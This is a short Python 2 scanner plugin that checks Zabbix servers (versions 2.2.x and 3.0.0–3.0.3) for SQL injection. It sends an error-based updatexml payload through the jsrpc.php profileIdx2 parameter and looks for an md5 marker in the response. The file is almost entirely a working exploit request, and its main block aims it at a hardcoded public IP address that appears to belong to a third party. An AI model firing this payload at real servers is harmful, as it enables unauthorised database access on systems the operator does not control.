#coding:utf-8
import urllib2


from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
        self.version='2.2.x,3.0.0-3.0.3'

        self.type = 'sqli'
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        res=None
        payload="/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
        result['result']=False
        res_html=None
        vul_url = target_url + payload
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except:
            res_html=''
        finally:
            if res is not None:
                res.close()

        if "ed733b8d10be225eceba344d533586" in res_html:
            info = vul_url + " zabbix "+self.version
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='zabbix SQL  Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = 'hole'
            return result
        else:
            vul_url = target_url + payload
            try:
                print vul_url
                res=urllib2.urlopen(vul_url,timeout=timeout)
                res_html = res.read()

            except:
                return result
            finally:
                if res is not None:
                    res.close()
                del res

            if 'ed733b8d10be225eceba344d533586' in res_html:
                info = vul_url  + " zabbix "+self.version
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='zabbix SQL  Vul'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vul_url
                result['VerifyInfo']['result'] =res_html
                result['VerifyInfo']['level'] = 'hole'
                return result
        return result





if __name__ == '__main__':
    print P().verify(ip='103.17.42.170',port='80')